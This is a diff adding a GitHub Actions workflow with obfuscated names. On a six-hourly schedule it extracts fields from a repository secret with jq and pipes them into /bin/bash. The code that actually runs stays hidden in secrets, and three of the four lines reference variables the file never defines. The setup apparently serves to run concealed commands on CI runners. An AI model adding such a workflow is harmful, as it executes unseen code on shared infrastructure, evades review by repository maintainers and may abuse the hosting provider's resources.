@@ -1,0 +1,20 @@
+name: xiebao19871010
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiebao19871010
+        env:
+          iig24: ${{ secrets.iig24 }}
+        run: |
+          echo $iig24 | jq -r .ctaw5033 | /bin/bash
+          echo $fih528 | jq -r .gptby642 | /bin/bash
+          echo $aav79406 | jq -r .aygdf03 | /bin/bash
+          echo $refwn73 | jq -r .tclwl5164 | /bin/bash
+
